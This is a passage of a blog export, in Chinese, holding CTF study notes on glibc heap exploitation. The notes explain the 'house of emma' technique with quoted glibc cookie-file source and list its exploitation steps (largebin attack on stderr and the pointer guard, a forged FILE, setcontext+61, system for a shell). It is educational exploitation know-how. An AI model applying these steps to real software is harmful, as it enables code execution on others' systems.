src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630032850548.png\" alt=\"buf入fastbins\"></p>\n<h3 id=\"free-b触发malloc-consolidate\"><a href=\"#free-b触发malloc-consolidate\" class=\"headerlink\" title=\"free b触发malloc_consolidate\"></a>free b触发malloc_consolidate</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033107787.png\" alt=\"触发malloc_consolidate\"></p>\n<h3 id=\"把buf放入largebin\"><a href=\"#把buf放入largebin\" class=\"headerlink\" title=\"把buf放入largebin\"></a>把buf放入largebin</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033400440.png\" alt=\"image-20250630033400440\"><br>因为大小不够，所以会被放入large bin</p>\n<h3 id=\"malloc，迁移largebins\"><a href=\"#malloc，迁移largebins\" class=\"headerlink\" title=\"malloc，迁移largebins\"></a>malloc，迁移largebins</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630033528949.png\" alt=\"image-20250630033528949\"></p>\n<ol>\n<li>这次大小足够了可以分配</li>\n<li>这个偏移计算是$[（target-0x10）-buf]-0x10$</li>\n</ol>\n<h3 id=\"分配target\"><a href=\"#分配target\" class=\"headerlink\" title=\"分配target\"></a>分配target</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250630034203589.png\" alt=\"image-20250630034203589\"><br>下一步就可以分配到target了</p>\n"},{"title":"house of emma","cover":"/img/紫发.png","_content":"# house of emma\n\n## 前言\n\n看完了kiwi，现在来看看emma，这两个手法的思路大差不差。但是emma有一道湖湘杯的例题，学习起来会方便很多\n## 原理\n\n### 源码\n\n核心同样是kiwi当中的那个断言，但是修改的思路转变了。在kiwi中是修改虚表中某个函数指针，在emma中则是修改vtable的地址。这个地址是--`_IO_cookie_jumps`\n\n```c\n/* Special file type for fopencookie function.  */\nstruct _IO_cookie_file\n{\n  struct _IO_FILE_plus __fp;\n  void *__cookie;\n  cookie_io_functions_t __io_functions;\n};\n\ntypedef struct _IO_cookie_io_functions_t\n{\n  cookie_read_function_t *read;        /* Read bytes.  */\n  cookie_write_function_t *write;    /* Write bytes.  */\n  cookie_seek_function_t *seek;        /* Seek/tell file position.  */\n  cookie_close_function_t *close;    /* Close file.  */\n} cookie_io_functions_t;\n\nstatic ssize_t\n_IO_cookie_read (FILE *fp, void *buf, ssize_t size)\n{\n  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;\n  cookie_read_function_t *read_cb = cfile->__io_functions.read;\n#ifdef PTR_DEMANGLE\n  PTR_DEMANGLE (read_cb);\n#endif\n\n  if (read_cb == NULL)\n    return -1;\n\n  return read_cb (cfile->__cookie, buf, size);\n}\n\nstatic ssize_t\n_IO_cookie_write (FILE *fp, const void *buf, ssize_t size)\n{\n  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;\n  cookie_write_function_t *write_cb = cfile->__io_functions.write;\n#ifdef PTR_DEMANGLE\n  PTR_DEMANGLE (write_cb);\n#endif\n\n  if (write_cb == NULL)\n    {\n      fp->_flags |= _IO_ERR_SEEN;\n      return 0;\n    }\n\n  ssize_t n = write_cb (cfile->__cookie, buf, size);\n  if (n < size)\n    fp->_flags |= _IO_ERR_SEEN;\n\n  return n;\n}\n\nstatic off64_t\n_IO_cookie_seek (FILE *fp, off64_t offset, int dir)\n{\n  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;\n  cookie_seek_function_t *seek_cb = cfile->__io_functions.seek;\n#ifdef PTR_DEMANGLE\n  PTR_DEMANGLE (seek_cb);\n#endif\n\n  return ((seek_cb == NULL\n       || (seek_cb (cfile->__cookie, &offset, dir)\n           == -1)\n       || offset == (off64_t) -1)\n      ? _IO_pos_BAD : offset);\n}\n\nstatic int\n_IO_cookie_close (FILE *fp)\n{\n  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;\n  cookie_close_function_t *close_cb = cfile->__io_functions.close;\n#ifdef PTR_DEMANGLE\n  PTR_DEMANGLE (close_cb);\n#endif\n\n  if (close_cb == NULL)\n    return 0;\n\n  return close_cb (cfile->__cookie);\n}\n```\n\n在emma的利用中,主要就是利用`_IO_cookie_read`,而在这个函数的开始几行,是对`rax` 加密,然后`call rax`,加密是另一个操作数是`fs:[0x30]`,这个指针可以利用`large bin attack` 修改.\n\n如果题目开启沙箱禁用了`execve`,那就需要`setcontext`中的`gadget`了\n## 利用思路\n\n1. 利用`largebins attack`等手段,修改掉`stderr`,然后伪造`fake io`\n2. 利用`setcontext+61`控制程序的执行流.\n3. 如果程序没有开启沙箱的话,可以考虑用`system`来`get shell`\n\n## 例子\n\n[湖湘杯-2021-house of emma](https://peruy.github.io/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E6%B9%96%E6%B9%98%E6%9D%AF-2021-house%20of%20emma/)\n","source":"_posts/heap/house of emma.md","raw":"---\ntitle: house of emma\ntags:\n    - House of XXX\n    - IO\ncategories:\n    - 学习笔记\ncover: /img/紫发.png\n---\n# house of emma\n\n## 前言\n\n看完了kiwi，现在来看看emma，这两个手法的思路大差不差。但是emma有一道湖湘杯的例题，学习起来会方便很多\n## 原理\n\n### 源码\n\n核心同样是kiwi当中的那个断言，但是修改的思路转变了。在kiwi中是修改虚表中某个函数指针，在emma中则是修改vtable的地址。这个地址是--`_IO_cookie_jumps`\n\n```c\n/* Special file type for fopencookie function.  */\nstruct _IO_cookie_file\n{\n  struct _IO_FILE_plus __fp;\n  void *__cookie;\n  cookie_io_functions_t __io_functions;\n};\n\ntypedef struct _IO_cookie_io_functions_t\n{\n  cookie_read_function_t *read;        /* Read bytes.  */\n  cookie_write_function_t *write;    /* Write bytes.  */\n  cookie_seek_function_t *seek;        /* Seek/tell file position.  */\n  cookie_close_function_t *close;    /* Close file.  */\n} cookie_io_functions_t;\n\nstatic ssize_t\n_IO_cookie_read (FILE *fp, void *buf, ssize_t size)\n{\n  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;\n  cookie_read_function_t *read_cb = cfile->__io_functions.read;\n#ifdef PTR_DEMANGLE\n  PTR_DEMANGLE (read_cb);\n#endif\n\n  if (read_cb == NULL)\n    return -1;\n\n  return read_cb (cfile->__cookie, buf, size);\n}\n\nstatic ssize_t\n_IO_cookie_write (FILE *fp, const void *buf, ssize_t size)\n{\n  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;\n  cookie_write_function_t *write_cb = cfile->__io_functions.write;\n#ifdef PTR_DEMANGLE\n  PTR_DEMANGLE (write_cb);\n#endif\n\n  if (write_cb == NULL)\n    {\n      fp->_flags |= _IO_ERR_SEEN;\n      return 0;\n    }\n\n  ssize_t n = write_cb (cfile->__cookie, buf, size);\n  if (n < size)\n    fp->_flags |= _IO_ERR_SEEN;\n\n  return n;\n}\n\nstatic off64_t\n_IO_cookie_seek (FILE *fp, off64_t offset, int dir)\n{\n  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;\n  cookie_seek_function_t *seek_cb = cfile->__io_functions.seek;\n#ifdef PTR_DEMANGLE\n  PTR_DEMANGLE (seek_cb);\n#endif\n\n  return ((seek_cb == NULL\n       || (seek_cb (cfile->__cookie, &offset, dir)\n           == -1)\n       || offset == (off64_t) -1)\n      ? _IO_pos_BAD : offset);\n}\n\nstatic int\n_IO_cookie_close (FILE *fp)\n{\n  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;\n  cookie_close_function_t *close_cb = cfile->__io_functions.close;\n#ifdef PTR_DEMANGLE\n  PTR_DEMANGLE (close_cb);\n#endif\n\n  if (close_cb == NULL)\n    return 0;\n\n  return close_cb (cfile->__cookie);\n}\n```\n\n在emma的利用中,主要就是利用`_IO_cookie_read`,而在这个函数的开始几行,是对`rax` 加密,然后`call rax`,加密是另一个操作数是`fs:[0x30]`,这个指针可以利用`large bin attack` 修改.\n\n如果题目开启沙箱禁用了`execve`,那就需要`setcontext`中的`gadget`了\n## 利用思路\n\n1. 利用`largebins attack`等手段,修改掉`stderr`,然后伪造`fake io`\n2. 利用`setcontext+61`控制程序的执行流.\n3. 如果程序没有开启沙箱的话,可以考虑用`system`来`get shell`\n\n## 例子\n\n[湖湘杯-2021-house of emma](https://peruy.github.io/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E6%B9%96%E6%B9%98%E6%9D%AF-2021-house%20of%20emma/)\n","slug":"heap/house of emma","published":1,"date":"2025-10-06T15:01:33.538Z","updated":"2025-10-10T12:40:44.622Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2ie001wuomy4rqb3sbn","content":"<h1 id=\"house-of-emma\"><a href=\"#house-of-emma\" class=\"headerlink\" title=\"house of emma\"></a>house of emma</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>看完了kiwi，现在来看看emma，这两个手法的思路大差不差。但是emma有一道湖湘杯的例题，学习起来会方便很多</p>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><h3 id=\"源码\"><a href=\"#源码\" class=\"headerlink\" title=\"源码\"></a>源码</h3><p>核心同样是kiwi当中的那个断言，但是修改的思路转变了。在kiwi中是修改虚表中某个函数指针，在emma中则是修改vtable的地址。这个地址是–<code>_IO_cookie_jumps</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Special file type for fopencookie function.  */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_cookie_file</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_plus</span> __<span class=\"title\">fp</span>;</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *__cookie;</span><br><span class=\"line\">  <span class=\"type\">cookie_io_functions_t</span> __io_functions;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_cookie_io_functions_t</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"type\">cookie_read_function_t</span> *read;        <span class=\"comment\">/* Read bytes.  */</span></span><br><span class=\"line\">  <span class=\"type\">cookie_write_function_t</span> *write;    <span class=\"comment\">/* Write bytes.  */</span></span><br><span class=\"line\">  <span class=\"type\">cookie_seek_function_t</span> *seek;        <span class=\"comment\">/* Seek/tell file position.  */</span></span><br><span class=\"line\">  <span class=\"type\">cookie_close_function_t</span> *close;    <span class=\"comment\">/* Close file.  */</span></span><br><span class=\"line\">&#125; <span class=\"type\">cookie_io_functions_t</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">ssize_t</span></span><br><span class=\"line\">_IO_cookie_read (FILE *fp, <span class=\"type\">void</span> *buf, <span class=\"type\">ssize_t</span> size)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_cookie_file</span> *<span class=\"title\">cfile</span> =</span> (<span class=\"keyword\">struct</span> _IO_cookie_file *) fp;</span><br><span class=\"line\">  <span class=\"type\">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> PTR_DEMANGLE</span></span><br><span class=\"line\">  PTR_DEMANGLE (read_cb);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (read_cb == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">ssize_t</span></span><br><span class=\"line\">_IO_cookie_write (FILE *fp, <span class=\"type\">const</span> <span class=\"type\">void</span> *buf, <span class=\"type\">ssize_t</span> size)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_cookie_file</span> *<span class=\"title\">cfile</span> =</span> (<span class=\"keyword\">struct</span> _IO_cookie_file *) fp;</span><br><span class=\"line\">  <span class=\"type\">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> PTR_DEMANGLE</span></span><br><span class=\"line\">  PTR_DEMANGLE (write_cb);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (write_cb == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n &lt; size)</span><br><span class=\"line\">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">off64_t</span></span><br><span class=\"line\">_IO_cookie_seek (FILE *fp, <span class=\"type\">off64_t</span> offset, <span class=\"type\">int</span> dir)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_cookie_file</span> *<span class=\"title\">cfile</span> =</span> (<span class=\"keyword\">struct</span> _IO_cookie_file *) fp;</span><br><span class=\"line\">  <span class=\"type\">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> PTR_DEMANGLE</span></span><br><span class=\"line\">  PTR_DEMANGLE (seek_cb);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> ((seek_cb == <span class=\"literal\">NULL</span></span><br><span class=\"line\">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class=\"line\">           == <span class=\"number\">-1</span>)</span><br><span class=\"line\">       || offset == (<span class=\"type\">off64_t</span>) <span class=\"number\">-1</span>)</span><br><span class=\"line\">      ? _IO_pos_BAD : offset);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span></span><br><span class=\"line\">_IO_cookie_close (FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_cookie_file</span> *<span class=\"title\">cfile</span> =</span> (<span class=\"keyword\">struct</span> _IO_cookie_file *) fp;</span><br><span class=\"line\">  <span class=\"type\">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> PTR_DEMANGLE</span></span><br><span class=\"line\">  PTR_DEMANGLE (close_cb);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (close_cb == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在emma的利用中,主要就是利用<code>_IO_cookie_read</code>,而在这个函数的开始几行,是对<code>rax</code> 加密,然后<code>call rax</code>,加密是另一个操作数是<code>fs:[0x30]</code>,这个指针可以利用<code>large bin attack</code> 修改.</p>\n<p>如果题目开启沙箱禁用了<code>execve</code>,那就需要<code>setcontext</code>中的<code>gadget</code>了</p>\n<h2 id=\"利用思路\"><a href=\"#利用思路\" class=\"headerlink\" title=\"利用思路\"></a>利用思路</h2><ol>\n<li>利用<code>largebins attack</code>等手段,修改掉<code>stderr</code>,然后伪造<code>fake io</code></li>\n<li>利用<code>setcontext+61</code>控制程序的执行流.</li>\n<li>如果程序没有开启沙箱的话,可以考虑用<code>system</code>来<code>get shell</code></li>\n</ol>\n<h2 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h2><p><a href=\"https://peruy.github.io/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E6%B9%96%E6%B9%98%E6%9D%AF-2021-house%20of%20emma/\">湖湘杯-2021-house of emma</a></p>\n","excerpt":"","more":"<h1 id=\"house-of-emma\"><a href=\"#house-of-emma\" class=\"headerlink\" title=\"house of emma\"></a>house of emma</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>看完了kiwi，现在来看看emma，这两个手法的思路大差不差。但是emma有一道湖湘杯的例题，学习起来会方便很多</p>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><h3 id=\"源码\"><a href=\"#源码\" class=\"headerlink\" title=\"源码\"></a>源码</h3><p>核心同样是kiwi当中的那个断言，但是修改的思路转变了。在kiwi中是修改虚表中某个函数指针，在emma中则是修改vtable的地址。这个地址是–<code>_IO_cookie_jumps</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Special file type for fopencookie function.  */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_cookie_file</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_plus</span> __<span class=\"title\">fp</span>;</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *__cookie;</span><br><span class=\"line\">  <span class=\"type\">cookie_io_functions_t</span> __io_functions;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_cookie_io_functions_t</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"type\">cookie_read_function_t</span> *read;        <span class=\"comment\">/* Read bytes.  */</span></span><br><span class=\"line\">  <span class=\"type\">cookie_write_function_t</span> *write;    <span class=\"comment\">/* Write bytes.  */</span></span><br><span class=\"line\">  <span class=\"type\">cookie_seek_function_t</span> *seek;        <span class=\"comment\">/* Seek/tell file position.  */</span></span><br><span class=\"line\">  <span class=\"type\">cookie_close_function_t</span> *close;    <span class=\"comment\">/* Close file.  */</span></span><br><span class=\"line\">&#125; <span class=\"type\">cookie_io_functions_t</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">ssize_t</span></span><br><span class=\"line\">_IO_cookie_read (FILE *fp, <span class=\"type\">void</span> *buf, <span class=\"type\">ssize_t</span> size)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_cookie_file</span> *<span class=\"title\">cfile</span> =</span> (<span class=\"keyword\">struct</span> _IO_cookie_file *) fp;</span><br><span class=\"line\">  <span class=\"type\">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> PTR_DEMANGLE</span></span><br><span class=\"line\">  PTR_DEMANGLE (read_cb);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (read_cb == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">ssize_t</span></span><br><span class=\"line\">_IO_cookie_write (FILE *fp, <span class=\"type\">const</span> <span class=\"type\">void</span> *buf, <span class=\"type\">ssize_t</span> size)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_cookie_file</span> *<span class=\"title\">cfile</span> =</span> (<span class=\"keyword\">struct</span> _IO_cookie_file *) fp;</span><br><span class=\"line\">  <span class=\"type\">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> PTR_DEMANGLE</span></span><br><span class=\"line\">  PTR_DEMANGLE (write_cb);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (write_cb == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n &lt; size)</span><br><span class=\"line\">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">off64_t</span></span><br><span class=\"line\">_IO_cookie_seek (FILE *fp, <span class=\"type\">off64_t</span> offset, <span class=\"type\">int</span> dir)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_cookie_file</span> *<span class=\"title\">cfile</span> =</span> (<span class=\"keyword\">struct</span> _IO_cookie_file *) fp;</span><br><span class=\"line\">  <span class=\"type\">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> PTR_DEMANGLE</span></span><br><span class=\"line\">  PTR_DEMANGLE (seek_cb);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> ((seek_cb == <span class=\"literal\">NULL</span></span><br><span class=\"line\">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class=\"line\">           == <span class=\"number\">-1</span>)</span><br><span class=\"line\">       || offset == (<span class=\"type\">off64_t</span>) <span class=\"number\">-1</span>)</span><br><span class=\"line\">      ? _IO_pos_BAD : offset);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span></span><br><span class=\"line\">_IO_cookie_close (FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_cookie_file</span> *<span class=\"title\">cfile</span> =</span> (<span class=\"keyword\">struct</span> _IO_cookie_file *) fp;</span><br><span class=\"line\">  <span class=\"type\">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> PTR_DEMANGLE</span></span><br><span class=\"line\">  PTR_DEMANGLE (close_cb);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (close_cb == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> close_cb (cfile-&gt;__cookie);</span><br><span 